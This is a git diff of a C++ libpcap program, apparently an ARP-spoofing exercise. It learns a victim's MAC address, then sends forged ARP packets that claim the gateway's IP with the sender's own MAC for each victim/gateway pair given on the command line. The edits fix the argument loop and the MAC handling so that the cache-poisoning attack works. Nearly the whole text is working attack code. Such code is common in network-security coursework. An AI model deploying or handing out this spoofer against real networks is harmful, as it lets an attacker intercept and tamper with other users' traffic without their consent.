@@ -59,12 +59,12 @@ Ip myIp(char* interfaceName){
 // send arp request to sender
 // then, can receive sender Mac Addr
 Mac getSMAC(Ip sip, const std::string& interfaceName, Mac myMacAddress, Ip myIp){
-        std::string smac;
+
         Mac sender_mac;
         char errbuf[PCAP_ERRBUF_SIZE];
                 //패킷을 받기 위함
         pcap_t* handle = pcap_open_live(interfaceName.c_str(), BUFSIZ, 1, 1, errbuf);
-        
+
         EthArpPacket normal_packet;
 
         normal_packet.eth_.dmac_ = Mac::broadcastMac();         // 브로드 캐스트로 뿌림(상대방의 mac을 정확하게 모르기 때문)
@@ -72,14 +72,14 @@ Mac getSMAC(Ip sip, const std::string& interfaceName, Mac myMacAddress, Ip myIp)
         normal_packet.eth_.type_ = htons(EthHdr::Arp);          // Arp로 보냄
 
         //ARP헤더 세팅
-        normal_packet.arp_.hrd_ = htons(ArpHdr::ETHER);         
+        normal_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
         normal_packet.arp_.pro_ = htons(EthHdr::Ip4);
-        normal_packet.arp_.hln_ = Mac::SIZE;                    
+        normal_packet.arp_.hln_ = Mac::SIZE;
         normal_packet.arp_.pln_ = Ip::SIZE;
         normal_packet.arp_.op_ = htons(ArpHdr::Request);
 
         //이 부분을 보고 테이블을 갱신
-        normal_packet.arp_.smac_ = myMacAddress;           //나는 누구요       
+        normal_packet.arp_.smac_ = myMacAddress;           //나는 누구요
         normal_packet.arp_.sip_ = htonl(myIp);               // 나는 누구요 (내 ip주소)
         normal_packet.arp_.tmac_ = Mac::nullMac();    // mac을 모름
         normal_packet.arp_.tip_ = htonl(sip);         // Sender ip주소
@@ -95,7 +95,7 @@ Mac getSMAC(Ip sip, const std::string& interfaceName, Mac myMacAddress, Ip myIp)
                         if (res == 1) {
                                 // 패킷 수신에 성공한 경우, ARP 응답 패킷에서 해당 IP 주소의 MAC 주소를 추출합니다.
                                 EthArpPacket* arpResponsePacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
-                                sender_mac = std::string(arpResponsePacket->arp_.smac_);
+                                sender_mac = arpResponsePacket->arp_.smac_;
                         }
                 }
         pcap_close(handle);
@@ -118,8 +118,8 @@ EthArpPacket Make_packet(char* interfaceName,
 
     char errbuf[PCAP_ERRBUF_SIZE];
     Mac macAddress = myMac(interfaceName);
-
-    packet.eth_.dmac_ = Mac(getSMAC(sip, interfaceName, my_mac,my_ip)); //Sender MAC
+    Mac SenderMac = getSMAC(sip,interfaceName,my_mac,my_ip);
+    packet.eth_.dmac_ = SenderMac; //Sender MAC
     packet.eth_.smac_ = Mac(my_mac); //내 MAC
     packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -130,7 +130,7 @@ EthArpPacket Make_packet(char* interfaceName,
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(my_mac); //내 MAC
     packet.arp_.sip_ = htonl(tip); //gateway ip , Input
-    packet.arp_.tmac_ = Mac(getSMAC(sip, interfaceName, my_mac, my_ip)); //sender MAC
+    packet.arp_.tmac_ = SenderMac; //sender MAC
     packet.arp_.tip_ = htonl(sip); //sender IP
 
     return packet;
@@ -152,38 +152,34 @@ int main(int argc, char* argv[]) {
         char* dev = argv[1]; //네트워크 인터페이스 명
         char errbuf[PCAP_ERRBUF_SIZE];
 
-        std::string interfaceName = argv[1];
         Mac my_mac;
         Ip my_ip;
 
         my_mac = myMac(dev);
         my_ip = myIp(dev);
 
-        std::string sip,tip;
-        Ip sip2,tip2;
         pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
                 fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                 return -1;
         }
         
-        for(int i=2; i<=argc-1; i++){
+        for(int i=2; i<argc-1; i+=2){
                 
         /*
         argv[1] = network_interface name
         argv[i] = vitcim ip
         argv[i+1] = gateway ip
         */
-                std::string sender_ip = argv[i];
-                std::string target_ip = argv[i+1];
-                // sip = argv[i];
-                // tip = argv[i+1];
+            std::string sender_ip = argv[i];
+            std::cout << sender_ip << std::endl;
 
-                sip = sender_ip;
-                tip = target_ip;
-                
-                EthArpPacket packet = Make_packet(dev , my_mac ,sip,tip,my_ip);
-                send_packet(handle,packet);
+            std::string target_ip = argv[i+1];
+            std::cout << target_ip << std::endl;
+
+            std::cout << std::endl;
+            EthArpPacket packet = Make_packet(dev , my_mac ,Ip(sender_ip),Ip(target_ip),my_ip);
+            send_packet(handle,packet);
         }
         pcap_close(handle);
 }
